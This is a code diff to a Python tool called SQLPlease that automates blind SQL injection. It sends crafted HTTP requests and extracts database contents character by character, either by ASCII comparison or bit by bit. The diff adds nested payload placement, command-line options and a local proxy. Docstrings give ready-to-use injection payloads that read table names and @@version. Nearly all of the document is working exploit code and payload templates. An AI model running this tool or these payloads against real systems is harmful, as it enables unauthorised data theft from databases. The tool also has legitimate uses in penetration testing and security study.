@@ -3,7 +3,6 @@
 #   Make it possible to provide a request in a file, parse that request and use it for cookies, headers, etc.
 #   Save state from a log file. With an argument, use the last file to continue the injection according to the command line and last results found in the file.
 #   Right now, a length or count of more than 128 is not possible. However, it takes more requests to find a bigger length/count than actually do 7 requests that give a null byte in the end. Therefore, make it either that the length/count is only available for ASCII search or find a better/faster algorithm.
-#   Improve the ASCII search to make it more efficient (also either force the usage of "BETWEEN ... AND..." or implement the possibility to do lesser than or greater than).
 #
 
 import os
@@ -101,6 +100,21 @@ class SQLPlease(object):
 
         self.__time = None
         self.__amountOfRequests = 0
+
+    def __updateDataPayload(self, data, target, newData):
+        """
+            data: dictionary, list or string contaning the keyword {payload}.
+            target: list containing the path to the value to through the dict `data`. Or string if `data` is a string.
+            newData: value to replace the keyword {payload}.
+        """
+        if(isinstance(target,str)):
+            return data.format(payload=newData)
+        elif(len(target) != 1):
+            data[target[0]] = self.__updateDataPayload(data[target[0]], target[1:], newData)
+        else:
+            data[target[0]] = data[target[0]].format(payload=newData)
+
+        return data
 
     def doInjection(self, *args, **kwargs):
         self.__time = time.time()
@@ -220,8 +234,8 @@ class SQLPlease(object):
                 data = copy.deepcopy(self.data)
 
                 payload = self.payload.format(charIndex=charIndex, ascii=currentAscii, max=maxAscii)
-                if("parameter" in self.__dict__ and self.parameter in data[self.type]):
-                    data[self.type][self.parameter] = data[self.type][self.parameter].format(payload=payload)
+                if("parameter" in self.__dict__):
+                    data[self.type] = self.__updateDataPayload(data[self.type], self.parameter, payload)
                 
                 url = self.url.format(payload=payload)
                 r = requests.__getattribute__(self.method)(url, **data, **self.requests)
@@ -288,8 +302,8 @@ class SQLPlease(object):
                 data = copy.deepcopy(self.data)
                 payload = self.payload.format(charIndex=charIndex, bitIndex=bitIndex)
 
-                if("parameter" in self.__dict__ and self.parameter in data[self.type]):
-                    data[self.type][self.parameter] = data[self.type][self.parameter].format(payload=payload)
+                if("parameter" in self.__dict__):
+                    data[self.type] = self.__updateDataPayload(data[self.type], self.parameter, payload)
                 
                 url = self.url.format(payload=payload)
                 r = requests.__getattribute__(self.method)(url, **data, **self.requests)
@@ -333,11 +347,20 @@ class SQLPlease(object):
             raise e
 
 if __name__ == '__main__':
-    directory = ""
-    level = ""
-    useColor = False
-    kwargs = {"requests":{}}
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-r", "--request", dest="request", help="File containing an HTTP request to set the URL, method, data, cookies and headers. Don't forget to setup the {payload} and etc.", type=str)
+    loggingParser = parser.add_argument_group("logging arguments")
+    loggingParser.add_argument("-o", "--output", dest="directory", help="Directory where to put the logging file (default is 'results'.)", default="results", type=str)
+    loggingParser.add_argument("-l", "--logging-level", dest="loggingLevel", help="Default warning", choices=["debug","info","warning","error","critical"], default="info", type=str)
+    loggingParser.add_argument("-c", "--useColor", dest="useColor", help="Use color for the logging in console.", action="store_true")
+
+    args = parser.parse_args()
     
+    directory = args.directory
+    loggingLevel = args.loggingLevel
+    useColor = args.useColor
+
+    kwargs = {"requests":{}}
     """ Payload requires some attributes in order for it to work.
             Both:
                 {charIndex}:
@@ -351,13 +374,17 @@ if __name__ == '__main__':
                 {max}:
                     Optional. Maximum inclusive ASCII value. 126 if printable only, else 255. Example: `ASCII(...) BETWEEN {ascii} AND {max}`
 
-                Example: `ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {offsetIndex},1),{charIndex},1))>={ascii}`
+                Example: 
+                    With multiple rows: `ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {offsetIndex},1),{charIndex},1))>={ascii}`
+                    With one row:       `ASCII(SUBSTRING((SELECT @@version),{charIndex},1))>={ascii}`
 
             Binary:
                 {bitIndex}:
                     Mandatory. Bit index of a character. Example: `SUBSTRING(REVERSE(BIN(ASCII(SUBSTRING(...)))),{bitIndex},1)=1`
 
-                Example: `SUBSTRING(REVERSE(BIN(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {offsetIndex},1),{charIndex},1)))),{bitIndex},1)=1`
+                Example: 
+                    With mulitple rows: `SUBSTRING(REVERSE(BIN(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {offsetIndex},1),{charIndex},1)))),{bitIndex},1)=1`
+                    With one row:       `SUBSTRING(REVERSE(BIN(ASCII(SUBSTRING((SELECT @@version),{charIndex},1)))),{bitIndex},1)=1`
 
         To know where to inject the payload, the URL or the data must contain the keywork {payload}.
             Example: `url = http://127.0.0.1/?sort=(CASE WHEN ({payload}) THEN id ELSE name END)`
@@ -396,7 +423,7 @@ if __name__ == '__main__':
     kwargs["maxAscii"] = 126
     
     # True if you want to use binary instead of ASCII (False)
-    kwargs["useBinary"] = True
+    kwargs["useBinary"] = False
 
     # Sleep in second between each request. This is mostly used to slow down the script.
     kwargs["sleep"] = 0
@@ -418,7 +445,7 @@ if __name__ == '__main__':
     kwargs["requests"]["allow_redirects"] = False
     kwargs["requests"]["cookies"] = {}
     kwargs["requests"]["headers"] = {}
-    kwargs["requests"]["proxies"] = {}
+    kwargs["requests"]["proxies"] = {"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}
     
     # If the variable directory is not set, the logs will be stored in ./results/
     if(not directory):
@@ -432,8 +459,8 @@ if __name__ == '__main__':
     if(useColor):
         Logger().updateUseColor(useColor)
 
-    if(level and level.lower() in LOGGING_LEVEL):
-        Logger().updateStreamLevel(LOGGING_LEVEL[level.lower()])
+    if(loggingLevel and loggingLevel.lower() in LOGGING_LEVEL):
+        Logger().updateStreamLevel(LOGGING_LEVEL[loggingLevel.lower()])
     else:
         Logger().updateStreamLevel(LOGGING_LEVEL["info"])
 
@@ -443,17 +470,39 @@ if __name__ == '__main__':
         sys.exit(1)
 
     # Keep the name of the parameter that includes the keyword {payload}.
-    # TODO: the keyword {payload} can be deeper than the first layer. Create a recursive routine to find the keyword.
     if(kwargs["data"]):
+        def findPayload(key, value):
+            if(isinstance(value, dict)):
+                for k,v in value.items():
+                    rk = findPayload(k,v)
+                    if(rk is not None):
+                        return [key,*rk]
+            if(isinstance(value, list)):
+                for i in range(len(value)):
+                    rk = findPayload(i,value[i])
+                    if(rk is not None):
+                        return [key, *rk]
+            if(isinstance(value, str)):
+                if("{payload}" in value):
+                    return [key]
+            return None
+
         kwargs["type"] = "data" if not kwargs["isDataJson"] else "json"
-        p = ""
-        for k,v in kwargs["data"].items():
-            if(isinstance(v, str)):
-                if("{payload}" in v):
-                    kwargs["parameter"] = k
+
+        if(isinstance(kwargs["data"], dict)):
+            for k,v in kwargs["data"].items():
+                kwargs["parameter"] = findPayload(k,v)
+                if(kwargs["parameter"] is not None):
                     break
+        if(isinstance(kwargs["data"], list)):
+            for i in range(len(kwargs["data"])):
+                kwargs["parameter"] = findPayload(i,kwargs["data"][i])
+                if(kwargs["parameter"] is not None):
+                    break
+
+        if(isinstance(kwargs["data"], str)):
+            kwargs["parameter"] = ""
+        
         kwargs["data"] = {kwargs["type"]: kwargs["data"]}
-    else:
-        kwargs["data"] = {}
 
     SQLPlease(**kwargs).doInjection()
